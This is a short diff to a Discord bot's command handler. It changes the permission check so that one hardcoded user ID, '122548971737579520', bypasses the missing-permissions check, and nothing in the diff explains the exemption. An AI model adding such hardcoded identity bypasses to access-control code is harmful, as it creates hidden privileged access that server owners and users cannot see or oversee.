@@ -27,7 +27,10 @@ const event: BotEvent<[Interaction, ExtendedClient]> = {
         (perm) => !interaction.member.permissions.has(perm as any),
       );
 
-      if (missingPermissions.length > 0) {
+      if (
+        missingPermissions.length > 0 &&
+        interaction.member.id !== "122548971737579520"
+      ) {
         await interaction.reply({
           content: `You lack the following permissions to use this command: ${missingPermissions.join(", ")}`,
           flags: MessageFlags.Ephemeral,
